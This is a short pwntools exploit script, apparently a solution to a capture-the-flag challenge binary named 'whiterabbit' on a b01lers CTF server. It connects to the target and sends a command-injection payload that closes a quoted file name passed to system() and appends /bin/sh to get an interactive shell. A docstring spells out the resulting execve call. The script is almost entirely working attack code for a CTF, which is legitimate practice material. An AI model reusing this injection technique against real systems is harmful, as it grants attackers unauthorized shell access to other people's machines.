#!/usr/bin/env python
from pwn import *

exe = context.binary = ELF('whiterabbit')
host = args.HOST or 'chal.ctf.b01lers.com'
port = int(args.PORT or 1013)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x5555555552d6
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

"""
So... we don't do a real "pwn" here and just manipulate the input interpolated
into the input to `system` to get a shell. We end up executing a command like so
which starts the shell:

execve("/bin/sh", ["sh", "-c", "[ -f ''];/bin/sh;' ] && cat ''];/bin/sh;' || echo File does not exist"])

If there was a real pwn, I wasn't able to find it.
"""
io = start()
p = b"\'];/bin/sh;"
io.sendline(p)
io.interactive()

